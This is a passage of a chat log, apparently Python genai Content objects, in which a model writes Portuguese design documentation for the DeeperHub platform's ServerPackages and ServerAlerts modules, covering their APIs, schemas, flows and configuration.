O pr√≥ximo poderia ser `DeeperHub.ServerPackages` (para itens/VIPs de servidor) ou `DeeperHub.ServerAlerts` (para an√∫ncios mais urgentes), ou podemos mudar para `DeeperHub.Lists` que parece ser um m√≥dulo de listagem gen√©rico?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os m√≥dulos relacionados a `Servers` e detalhar o `DeeperHub.ServerPackages`. Este m√≥dulo lida com pacotes ou itens que podem ser oferecidos pelos servidores, como passes VIP, itens virtuais, etc.

---

# M√≥dulo: `DeeperHub.ServerPackages` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerPackages`

O m√≥dulo `DeeperHub.ServerPackages` √© respons√°vel por gerenciar **pacotes, itens ou assinaturas (packages)** que os propriet√°rios de servidores podem oferecer aos jogadores na plataforma DeeperHub. Estes pacotes podem representar uma variedade de ofertas, como acesso VIP, moedas virtuais espec√≠ficas do servidor, itens no jogo, ou outros benef√≠cios e produtos digitais.

Este m√≥dulo lida com:
*   A defini√ß√£o, cria√ß√£o e gerenciamento de pacotes pelos propriet√°rios de servidores.
*   A listagem de pacotes dispon√≠veis para um servidor.
*   (Potencialmente) A integra√ß√£o com um sistema de invent√°rio de usu√°rio ou um sistema de processamento de \"compras\" desses pacotes.

O objetivo √© fornecer uma maneira para os servidores monetizarem ou oferecerem valor adicional aos seus jogadores atrav√©s de ofertas estruturadas. üòä

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.ServerPackages`. Ser√° tratado como `DeeperHub.ServerPackages`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Pacotes (`create_server_package/1`, `get_server_package/1`, `update_server_package/2`, `delete_server_package/1`):**
    *   Permitir que propriet√°rios de servidores (ou administradores com permiss√£o) criem novos pacotes associados aos seus servidores.
    *   Cada pacote inclui: nome, descri√ß√£o, pre√ßo (se aplic√°vel, e em que moeda ou tipo de ponto), dura√ß√£o (se for uma assinatura), itens/benef√≠cios inclu√≠dos (pode ser um campo JSONB flex√≠vel), imagem, status (ativo, inativo).
    *   Atualizar ou excluir pacotes existentes.
*   **Listagem de Pacotes:**
    *   Listar todos os pacotes dispon√≠veis para um servidor espec√≠fico (`list_server_packages_by_server/2`).
    *   Listar todos os pacotes globalmente com filtros (ex: por tipo, por pre√ßo) (`list_server_packages/1`).
    *   Suportar pagina√ß√£o.
*   **Tipos de Pacotes:**
    *   Suportar diferentes tipos de pacotes (ex: `:one_time_purchase`, `:subscription`, `:currency_pack`).
*   **Gerenciamento de Invent√°rio/Concess√£o (Integra√ß√£o):**
    *   Quando um pacote √© \"adquirido\" por um usu√°rio, este m√≥dulo precisa informar outro sistema (ex: `DeeperHub.UserInventoryService` ou um sistema de concess√£o de direitos) para creditar os itens/benef√≠cios ao usu√°rio. Esta parte pode ser complexa e envolver transa√ß√µes.
*   **Integra√ß√£o com Pagamentos (Opcional):**
    *   Se os pacotes tiverem pre√ßos em moeda real, este m√≥dulo precisar√° se integrar com um `DeeperHub.Payments` para processar a compra antes de conceder o pacote.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a cria√ß√£o, compra e uso de pacotes.
    *   Publicar eventos de dom√≠nio (ex: `server_package.created`, `user.package_acquired`) no `Core.EventBus`.
    *   Auditar a cria√ß√£o/modifica√ß√£o de pacotes.
*   **Caching:**
    *   Cachear defini√ß√µes de pacotes para servidores frequentemente visualizados.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerPackages` (Fachada P√∫blica):**
    *   Ponto de entrada para opera√ß√µes de pacotes de servidor.
    *   Delega para o `ServerPackagesService`.
2.  **`DeeperHub.ServerPackages.Services.ServerPackagesService` (ou `DefaultServerPackagesService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para pacotes.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ServerPackageSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do propriet√°rio ao criar.
        *   `DeeperHub.Auth`/`RBAC`: Para permiss√µes de gerenciamento.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.Cache`: Para cachear.
        *   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes (ex: tipos de pacotes permitidos).
        *   (Crucial) `DeeperHub.UserInventoryService` (Novo Sugerido) ou `DeeperHub.Payments` e um `GrantingService`: Para lidar com a aquisi√ß√£o e concess√£o de pacotes.
3.  **`DeeperHub.ServerPackages.Schemas.ServerPackageSchema` (ex-`ServerPackage`):**
    *   Campos: `id`, `server_id`, `name`, `description`, `price_currency` (ex: \"BRL\", \"USD\", \"POINTS\"), `price_amount` (Decimal), `package_type` (atom: `:one_time`, `:subscription`), `duration_days` (integer, se assinatura), `items_or_benefits_payload` (jsonb: ex `%{vip_level: \"gold\", in_game_currency: 1000, items: [%{item_id: \"sword_of_valor\", quantity: 1}]}`), `image_url`, `is_active`, `available_from` (DateTime), `available_until` (DateTime), `max_purchases_per_user` (integer | nil), `total_purchased_count`.
4.  **`DeeperHub.ServerPackages.Storage` (ou l√≥gica no `ServerPackagesService`):**
    *   Encapsula as queries Ecto.
5.  **(Potencial) `DeeperHub.UserPackagesService` ou `UserInventoryService` (Novo M√≥dulo Sugerido):**
    *   Respons√°vel por rastrear quais pacotes um usu√°rio adquiriu, quando expiram (se assinatura), e o estado de seus benef√≠cios.
    *   Schema: `UserPackageInstanceSchema` (`user_id`, `server_package_id`, `acquired_at`, `expires_at`, `status` (`:active`, `:expired`, `:used_up`)).
6.  **`DeeperHub.ServerPackages.CachedAdapter` (Opcional):**
    *   Camada de cache expl√≠cita.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_packages/
‚îú‚îÄ‚îÄ server_packages.ex                # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_packages_service.ex    # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ server_package_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional)
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional)
‚îú‚îÄ‚îÄ supervisor.ex                     # (Se houver GenServers)
‚îî‚îÄ‚îÄ telemetry.ex
```
E o novo m√≥dulo sugerido:
```
lib/deeper_hub/user_inventory/       # Ou UserPackages
‚îú‚îÄ‚îÄ user_inventory_service.ex
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ user_package_instance_schema.ex
‚îî‚îÄ‚îÄ ...
```

### 3.3. Decis√µes de Design Importantes

*   **Flexibilidade do Payload de Benef√≠cios:** Usar um campo JSONB (`items_or_benefits_payload`) para os detalhes do que o pacote concede oferece grande flexibilidade sem precisar alterar o schema do DB para cada novo tipo de benef√≠cio. A interpreta√ß√£o desse payload ocorreria no momento da concess√£o.
*   **Separa√ß√£o entre Defini√ß√£o e Inst√¢ncia Adquirida:** `ServerPackageSchema` √© a *defini√ß√£o* do que est√° √† venda. Um `UserPackageInstanceSchema` (em um m√≥dulo de invent√°rio/usu√°rio) representaria um pacote *adquirido* por um usu√°rio.
*   **Fluxo de \"Compra\"/Aquisi√ß√£o:** Este √© o fluxo mais complexo. Se envolver pagamento real, a transa√ß√£o deve ser at√¥mica (pagamento bem-sucedido -> concess√£o do pacote). Se for com moeda virtual do jogo/plataforma, a l√≥gica de d√©bito/cr√©dito deve ser robusta.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio de Servidor Cria um Pacote \"VIP Mensal\":**
    *   Define nome, descri√ß√£o \"Acesso VIP por 30 dias com b√¥nus de XP\", pre√ßo, tipo `:subscription`, `duration_days: 30`, `items_or_benefits_payload: %{vip_status: true, xp_boost_multiplier: 1.5}`.
    *   API chama `ServerPackages.create_server_package(user_id, server_id, attrs)`.
*   **Jogador \"Compra\" o Pacote VIP Mensal (com pontos da plataforma):**
    *   Jogador clica em \"Comprar\" no pacote VIP.
    *   API chama uma fun√ß√£o como `DeeperHub.UserInventory.acquire_package(user_id, server_package_id, %{payment_method: :points})`.
    *   `UserInventoryService` (ou similar):
        1.  Verifica se o usu√°rio tem pontos suficientes (chama `PointsService`).
        2.  Debita os pontos.
        3.  Chama `ServerPackages.grant_package_benefits(user_id, server_package_id, server_package_details)` (ou o `RewardsHandler` se modelado como recompensa).
        4.  Cria um `UserPackageInstanceSchema` para o usu√°rio.
        5.  Notifica o usu√°rio.
*   **Sistema Verifica se o VIP do Usu√°rio Est√° Ativo:**
    *   Ao logar no servidor de jogo, o servidor pode consultar (via API DeeperHub) `UserInventory.has_active_benefit?(user_id, server_id, :vip_status)`.

## üåä 5. Fluxos Importantes

### Fluxo de Aquisi√ß√£o de Pacote (Simplificado, sem pagamento real)

1.  **Usu√°rio (UI):** Seleciona um pacote para \"adquirir\" (ex: usando moeda do jogo).
2.  **Controller API:** Valida. Chama `DeeperHub.UserInventory.acquire_package(user_id, server_package_id, acquisition_details)`.
3.  **`UserInventoryService.acquire_package/3`:**
    *   Busca `ServerPackageSchema` para obter detalhes (pre√ßo em moeda do jogo, benef√≠cios).
    *   Verifica se o usu√°rio pode adquirir (ex: saldo de moeda do jogo, se n√£o √© de uso √∫nico e j√° foi adquirido).
    *   **Inicia Transa√ß√£o (Repo):**
        *   Debita a moeda do jogo do usu√°rio (chama `CurrencyService.debit_user_balance`).
        *   Cria um registro `UserPackageInstanceSchema` (`user_id`, `server_package_id`, `acquired_at`, `status: :active`, `expires_at` se for assinatura).
        *   Incrementa `total_purchased_count` no `ServerPackageSchema`.
    *   **Fim da Transa√ß√£o.**
    *   Se a transa√ß√£o for bem-sucedida:
        *   (Opcional) Chama Handlers espec√≠ficos para aplicar benef√≠cios imediatos (ex: atribuir um papel VIP no Discord, dar um item no jogo - pode ser via eventos).
        *   Publica evento `user_package.acquired` no `Core.EventBus`.
        *   Notifica o usu√°rio.
        *   Retorna `{:ok, user_package_instance}`.
    *   Se falhar, retorna erro.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.ServerPackages`)

### 6.1. Gerenciamento de Defini√ß√µes de Pacotes (Propriet√°rio/Admin)

*   **`DeeperHub.ServerPackages.create_server_package(creator_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, ServerPackage.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: ..., description: ..., price_currency: ..., price_amount: ..., package_type: ..., items_or_benefits_payload: ..., ...}`.
*   **`DeeperHub.ServerPackages.update_server_package(package_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, ServerPackage.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerPackages.delete_server_package(package_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
    *   (Considerar soft delete ou impedir exclus√£o se houver inst√¢ncias ativas).

### 6.2. Consulta de Pacotes (P√∫blico/Usu√°rios)

*   **`DeeperHub.ServerPackages.get_server_package(package_id :: String.t()) :: {:ok, ServerPackage.t() | nil}`**
*   **`DeeperHub.ServerPackages.list_server_packages_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(ServerPackage.t()), Pagination.t()}`**
    *   `opts`: `:is_active` (boolean), `:package_type`, `:page`, `:per_page`.
*   **`DeeperHub.ServerPackages.list_all_server_packages(filters :: map(), opts :: keyword()) :: {:ok, list(ServerPackage.t()), Pagination.t()}`** (Para uma loja global, por exemplo)
    *   `filters`: `:server_id`, `:package_type`, `:price_range`.

### 6.3. (API para o M√≥dulo de Invent√°rio/Aquisi√ß√£o - Interna ao DeeperHub)

*   **`DeeperHub.ServerPackages.get_package_details_for_granting(package_id :: String.t()) :: {:ok, %{benefits: map(), duration_days: integer() | nil}} | {:error, :not_found}`** (Nova Sugest√£o)
    *   Usado pelo `UserInventoryService` para saber o que conceder.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_packages, :enabled]`** (Boolean).
*   **`[:server_packages, :allowed_currencies]`** (List de Strings/Atoms): Ex: `[\"BRL\", \"USD\", \"POINTS\", \"CREDITS\"]`.
*   **`[:server_packages, :default_package_types]`** (List de Atoms): Tipos de pacotes permitidos.
*   **`[:server_packages, :max_packages_per_server]`** (Integer).
*   **`[:server_packages, :cache, :package_list_ttl_seconds]`** (Integer).
*   **`[:server_packages, :requires_payment_integration_for_real_money]`** (Boolean): Se `true`, pacotes com `price_currency` \"BRL\", \"USD\" devem passar por `DeeperHub.Payments`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes.
*   `DeeperHub.Notifications`: Para notificar sobre aquisi√ß√µes.
*   **`DeeperHub.UserInventoryService` (ou similar, NOVO):** Essencial para rastrear o que os usu√°rios possuem.
*   `DeeperHub.Payments` (Opcional): Se houver pagamento com moeda real.
*   `DeeperHub.PointsService` (Opcional): Se houver pagamento com pontos da plataforma.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   `Decimal`: Para manipula√ß√£o de pre√ßos.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **UI do Propriet√°rio do Servidor:** Interface para criar e gerenciar os pacotes de seu servidor.
*   **Loja do Servidor (UI do Jogador):** Exibe os pacotes dispon√≠veis (`list_server_packages_by_server`) e permite a \"compra\" (que aciona o `UserInventoryService.acquire_package`).
*   **Servidor de Jogo (Externo):** Pode precisar de uma API para verificar quais pacotes/benef√≠cios um jogador possui (ex: consultando o `UserInventoryService`).

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ServerPackageSchema`.
*   Testar a l√≥gica de listagem com filtros.
*   Testar o fluxo de \"aquisi√ß√£o\" de um pacote, incluindo a intera√ß√£o com `UserInventoryService` e (mocked) `Payments` ou `PointsService`.
*   Testar a correta aplica√ß√£o de benef√≠cios/dura√ß√£o para diferentes `package_type`.
*   Localiza√ß√£o: `test/deeper_hub/server_packages/`.

### 10.2. M√©tricas

*   `deeper_hub.server_packages.definition.created.count` (tags: `server_id`, `package_type`)
*   `deeper_hub.server_packages.acquired.count` (tags: `package_id`, `server_id`, `payment_type` (`points`, `real_money`))
*   `deeper_hub.server_packages.revenue.sum` (Contador, tags: `package_id`, `currency`) (Se houver pagamento real)
*   `deeper_hub.server_packages.active_subscriptions.gauge` (Gauge, tags: `package_id`)

### 10.3. Logs

*   **N√≠vel INFO:** Pacote criado/atualizado. Pacote adquirido por usu√°rio.
*   **N√≠vel WARNING:** Tentativa de adquirir pacote com saldo insuficiente ou al√©m dos limites.
*   **N√≠vel ERROR:** Falha ao conceder benef√≠cios ap√≥s pagamento. Erro ao persistir `UserPackageInstance`.

### 10.4. Telemetria

*   `[:deeper_hub, :server_packages, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{package_id: id, server_id: id, creator_id: id}`
*   `[:deeper_hub, :user_inventory, :package_instance, :created | :status_changed]` (Emitido pelo `UserInventoryService`)
    *   Metadados: `%{user_package_instance_id: id, user_id: id, server_package_id: id, new_status: atom}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na aquisi√ß√£o (ex: pagamento falhou, saldo insuficiente) devem ser tratadas atomicamente ‚Äì o pacote n√£o √© concedido.
*   Erros ao aplicar benef√≠cios ap√≥s uma aquisi√ß√£o bem-sucedida devem ser robustos (ex: enfileirar para retry, alertar admin).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Valida√ß√£o de Pre√ßos e Moedas:** Garantir que os pre√ßos sejam manuseados corretamente e que as moedas sejam v√°lidas.
*   **Dupla Concess√£o:** A l√≥gica de aquisi√ß√£o deve impedir que um pacote de uso √∫nico seja concedido m√∫ltiplas vezes ou que uma assinatura seja estendida indevidamente sem pagamento.
*   **Autoriza√ß√£o:** Apenas propriet√°rios de servidores podem criar/gerenciar pacotes para *seus* servidores.
*   **Payload de Benef√≠cios:** Se o `items_or_benefits_payload` for muito flex√≠vel, validar seu conte√∫do para evitar abusos ou inje√ß√£o de dados maliciosos que possam ser interpretados por outros sistemas.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novos tipos de pacotes ou benef√≠cios, pense em como a concess√£o e o rastreamento ser√£o feitos no `UserInventoryService` (ou similar).
*   A clareza na UI sobre o que cada pacote oferece √© fundamental.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"carrinho de compras\" para adquirir m√∫ltiplos pacotes de uma vez.
*   [ ] Suporte para pacotes presente√°veis (gifting).
*   [ ] Integra√ß√£o com um sistema de cupons de desconto para pacotes.
*   [ ] Permitir pacotes com quantidade limitada (ex: \"Apenas 100 dispon√≠veis\").
*   [ ] Hist√≥rico de pre√ßos para pacotes.
*   [ ] L√≥gica para lidar com reembolsos ou chargebacks de pacotes pagos.
*   [ ] \"Pacotes din√¢micos\" cujo conte√∫do ou pre√ßo podem variar com base em certos crit√©rios ou eventos.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo adiciona uma dimens√£o de monetiza√ß√£o/engajamento importante!

Para o pr√≥ximo, podemos fazer `DeeperHub.ServerAlerts` ou `DeeperHub.ServerUpdateMessages`, ou se preferir, o m√≥dulo mais gen√©rico `DeeperHub.Lists`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os m√≥dulos relacionados a `Servers` e detalhar o `DeeperHub.ServerAlerts`. Este m√≥dulo √© para comunica√ß√£o mais direta e potencialmente urgente com os jogadores de um servidor.

---

# M√≥dulo: `DeeperHub.ServerAlerts` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerAlerts`

O m√≥dulo `DeeperHub.ServerAlerts` √© respons√°vel por gerenciar e entregar **alertas e an√∫ncios importantes** dos propriet√°rios de servidores para os jogadores ou para a comunidade de um servidor espec√≠fico na plataforma DeeperHub. Diferentemente de mensagens de atualiza√ß√£o mais longas (como patch notes, gerenciadas por `ServerUpdateMessages`), os alertas s√£o tipicamente mensagens mais curtas, diretas e que podem ter um car√°ter de urg√™ncia ou aviso.

Exemplos incluem:
*   An√∫ncio de rein√≠cio iminente do servidor.
*   Aviso sobre problemas t√©cnicos tempor√°rios.
*   Notifica√ß√£o de um evento especial come√ßando agora.
*   Mensagens de boas-vindas para novos jogadores no servidor (se n√£o automatizadas de outra forma).

Este m√≥dulo lida com a cria√ß√£o, visualiza√ß√£o e, potencialmente, a forma como esses alertas s√£o exibidos ou entregues aos usu√°rios relevantes. üòä

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.ServerAlerts`. Ser√° tratado como `DeeperHub.ServerAlerts`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Cria√ß√£o de Alertas (`create_alert/1`):**
    *   Permitir que propriet√°rios de servidores (ou administradores com permiss√£o) criem novos alertas para seus servidores.
    *   Cada alerta inclui: mensagem, tipo/severidade (ex: `:info`, `:warning`, `:critical`), servidor associado, data de in√≠cio e fim de validade/exibi√ß√£o (opcional).
*   **Gerenciamento de Alertas (`update_alert/2`, `delete_alert/1`):**
    *   Permitir a edi√ß√£o (se o alerta ainda n√£o foi amplamente disseminado) ou exclus√£o de alertas.
    *   Marcar alertas como ativos ou inativos.
*   **Listagem de Alertas:**
    *   Listar alertas ativos para um servidor espec√≠fico (`list_active_alerts_by_server/2`).
    *   Listar todos os alertas (hist√≥rico) para um servidor (`list_alerts_by_server/2`).
    *   (Opcional) Listar alertas globais da plataforma, se essa funcionalidade tamb√©m residir aqui.
*   **Exibi√ß√£o/Entrega de Alertas:**
    *   Fornecer dados para que a UI exiba alertas relevantes (ex: um banner no topo da p√°gina do servidor, uma notifica√ß√£o in-app espec√≠fica para quem est√° online naquele servidor).
    *   (Opcional) Integrar com `DeeperHub.Notifications` para enviar alertas como notifica√ß√µes push ou email para usu√°rios inscritos em alertas de um servidor (se o usu√°rio \"seguir\" o servidor ou optar por isso).
*   **Tipos de Alertas:**
    *   Suportar diferentes tipos de alertas que podem ter apresenta√ß√µes ou comportamentos distintos (ex: um alerta de \"manuten√ß√£o\" pode ter um contador regressivo).
*   **Programa√ß√£o de Alertas (Opcional):**
    *   Permitir que alertas sejam agendados para aparecer em um hor√°rio espec√≠fico.
*   **Observabilidade e Auditoria:**
    *   Logar a cria√ß√£o e modifica√ß√£o de alertas.
    *   Publicar eventos de dom√≠nio (ex: `server_alert.published`) no `Core.EventBus`.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerAlerts` (Fachada P√∫blica):**
    *   Ponto de entrada para opera√ß√µes de alertas de servidor.
    *   Delega para o `ServerAlertsService`.
2.  **`DeeperHub.ServerAlerts.Services.ServerAlertsService` (ou `DefaultServerAlertsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `AlertSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do criador.
        *   `DeeperHub.Auth`/`RBAC`: Para permiss√µes.
        *   `DeeperHub.Core.EventBus`.
        *   `DeeperHub.Core.Cache`: Para cachear alertas ativos.
        *   `DeeperHub.Notifications` (se alertas s√£o enviados como notifica√ß√µes push/email).
3.  **`DeeperHub.ServerAlerts.Schemas.AlertSchema` (ex-`Alert`):**
    *   Campos: `id`, `server_id`, `created_by_user_id`, `message` (string/text), `alert_type` (atom, ex: `:info`, `:warning`, `:maintenance`, `:event_starting`), `severity` (atom, ex: `:low`, `:medium`, `:high`), `start_time` (DateTime UTC, para exibi√ß√£o agendada), `end_time` (DateTime UTC, para expira√ß√£o autom√°tica), `is_active` (boolean), `target_audience` (atom, ex: `:all_server_players`, `:specific_roles_on_server` - opcional), `inserted_at`, `updated_at`.
4.  **`DeeperHub.ServerAlerts.Storage` (ou l√≥gica no `ServerAlertsService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.ServerAlerts.CachedAdapter` (Opcional):**
    *   Camada de cache expl√≠cita.
6.  **Workers (Opcional):**
    *   `AlertStatusUpdateWorker`: Para ativar/desativar alertas com base em `start_time` e `end_time`.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_alerts/
‚îú‚îÄ‚îÄ server_alerts.ex                  # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_alerts_service.ex      # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ alert_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional)
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional)
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îî‚îÄ‚îÄ alert_status_update_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex                     # (Se houver GenServers)
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Diferencia√ß√£o de `ServerUpdateMessages`:** Alertas s√£o geralmente mais curtos, mais imediatos e podem ter um \"tempo de vida\" mais curto. `UpdateMessages` s√£o mais para notas de patch e an√∫ncios mais permanentes.
*   **Mecanismo de Exibi√ß√£o:** Como os alertas s√£o mostrados aos usu√°rios √© uma decis√£o de UI/UX, mas este m√≥dulo precisa fornecer os dados de forma que possam ser facilmente consumidos (ex: \"mostrar os 3 alertas ativos mais recentes para este servidor\").
*   **Targeting de Audi√™ncia:** Inicialmente simples (todos os visitantes da p√°gina do servidor), mas pode evoluir para targeting mais espec√≠fico.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio Anuncia Rein√≠cio Iminente do Servidor:**
    *   Cria um alerta: \"Servidor reiniciando em 15 minutos para atualiza√ß√£o r√°pida!\" com tipo `:maintenance` e severidade `:high`.
    *   API chama `ServerAlerts.create_alert(user_id, server_id, attrs)`.
    *   O alerta aparece em destaque na p√°gina do servidor.
*   **Propriet√°rio Avisa sobre Lag Tempor√°rio:**
    *   Cria um alerta: \"Estamos experienciando lag tempor√°rio devido a um problema com o provedor. Estamos trabalhando nisso.\" tipo `:warning`, severidade `:medium`.
*   **Jogador Visita a P√°gina de um Servidor:**
    *   A UI chama uma API que internamente usa `ServerAlerts.list_active_alerts_by_server(server_id, %{limit: 3})` para buscar alertas a serem exibidos.

## üåä 5. Fluxos Importantes

### Fluxo de Cria√ß√£o e Exibi√ß√£o de Alerta

1.  **Propriet√°rio (UI):** Submete formul√°rio de novo alerta.
2.  **Controller API:** Valida auth. Chama `DeeperHub.ServerAlerts.create_alert(current_user.id, server_id, params[\"alert_attrs\"])`.
3.  **`ServerAlertsService.create_alert/3`:**
    *   Valida permiss√£o.
    *   Valida e sanitiza a mensagem.
    *   Cria um `AlertSchema` changeset (com `is_active: true`, `start_time` pode ser `now` ou futuro).
    *   `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `server_alert.created` no `Core.EventBus`.
        *   Invalida cache de alertas ativos para o servidor.
        *   (Opcional) Se `start_time` for imediato e houver integra√ß√£o com notifica√ß√µes push/in-app para \"seguidores\", enfileira essas notifica√ß√µes.
        *   Retorna `{:ok, alert_struct}`.
4.  **Outro Usu√°rio (UI):** Visita a p√°gina do servidor.
5.  **Controller API da P√°gina do Servidor:** Chama `DeeperHub.ServerAlerts.list_active_alerts_by_server(server_id, %{limit: 3})`.
6.  **`ServerAlertsService.list_active_alerts_by_server/2`:**
    *   Verifica o cache.
    *   Se miss, constr√≥i query Ecto para buscar `AlertSchema`s onde `server_id` corresponde, `is_active == true`, e `(start_time == nil OR start_time <= now()) AND (end_time == nil OR end_time >= now())`.
    *   Ordena por `inserted_at` descendente ou prioridade.
    *   Coloca no cache.
    *   Retorna a lista de alertas.
7.  **UI:** Exibe os alertas.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.ServerAlerts`)

*(Baseado na documenta√ß√£o original para `Alert` e expandindo)*

### 6.1. Gerenciamento de Alertas (Propriet√°rio/Admin)

*   **`DeeperHub.ServerAlerts.create_alert(creator_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, Alert.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{message: String.t(), alert_type: atom(), severity: atom() | nil, start_time: DateTime.t() | nil, end_time: DateTime.t() | nil}`.
*   **`DeeperHub.ServerAlerts.update_alert(alert_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Alert.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerAlerts.delete_alert(alert_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.ServerAlerts.activate_alert(alert_id :: String.t(), current_user_id :: String.t()) :: {:ok, Alert.t()}`** (Muda `is_active` para true)
*   **`DeeperHub.ServerAlerts.deactivate_alert(alert_id :: String.t(), current_user_id :: String.t()) :: {:ok, Alert.t()}`** (Muda `is_active` para false)

### 6.2. Consulta de Alertas

*   **`DeeperHub.ServerAlerts.get_alert(alert_id :: String.t()) :: {:ok, Alert.t() | nil}`**
*   **`DeeperHub.ServerAlerts.list_alerts_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Alert.t()), Pagination.t()}`**
    *   `opts`: `:is_active` (boolean), `:alert_type`, `:severity`, `:page`, `:per_page`, `:sort_by`.
*   **`DeeperHub.ServerAlerts.list_active_alerts_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Alert.t())}`** (Atalho para `list_alerts_by_server` com filtros de atividade e data).
    *   `opts`: `:limit`.
*   **`DeeperHub.ServerAlerts.broadcast_alert/3` (da doc original, mas parece mais uma a√ß√£o de alto n√≠vel que *usa* `create_alert` internamente para m√∫ltiplos usu√°rios se o targeting for para usu√°rios espec√≠ficos, ou apenas cria um alerta de servidor se for para todos do servidor):**
    *   Se a inten√ß√£o √© notificar m√∫ltiplos usu√°rios via `DeeperHub.Notifications` e tamb√©m criar um `AlertSchema` vis√≠vel na p√°gina do servidor, este nome faz sentido.
    *   `broadcast_alert(server_id, message, user_ids_or_target_group)`

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_alerts, :enabled]`** (Boolean).
*   **`[:server_alerts, :max_message_length]`** (Integer). (Padr√£o: `500`)
*   **`[:server_alerts, :default_alert_duration_minutes]`** (Integer | nil): Se `end_time` n√£o for fornecido, quanto tempo o alerta fica ativo. `nil` para indefinido. (Padr√£o: `60`)
*   **`[:server_alerts, :max_active_alerts_per_server_displayed]`** (Integer): Quantos alertas ativos mostrar na UI de uma vez. (Padr√£o: `3`)
*   **`[:server_alerts, :allowed_alert_types]`** (List de Atoms).
*   **`[:server_alerts, :cache, :active_alerts_ttl_seconds]`** (Integer).
*   **`[:server_alerts, :worker, :status_update_interval_minutes]`** (Integer).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`.
